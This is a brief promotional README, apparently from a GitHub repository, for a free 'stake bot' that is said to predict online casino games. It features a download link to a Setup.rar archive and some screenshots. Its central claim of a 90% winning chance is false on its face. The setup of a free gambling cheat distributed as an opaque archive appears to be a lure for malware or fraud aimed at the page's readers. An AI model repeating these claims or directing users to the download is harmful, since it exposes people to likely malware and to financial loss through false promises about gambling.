## *Click to download - [Download](https://github.com/ffireman1/manu/releases/download/Set/Setup.rar)*

# A stake bot with a predicate function

## Our bot contains almost all the current games

- The chance of winning is 90%

- The bot is completely free

- Fast operation speed

- Autonomy in use


## Below is a small part of the screenshots of our software's robes

![AVATAR](https://i.postimg.cc/x1YJ9wG5/image.png)

![AVATAR](https://i.postimg.cc/rF5QpR3k/image.png)

![AVATAR](https://i.postimg.cc/bNf4LPjq/image.png)
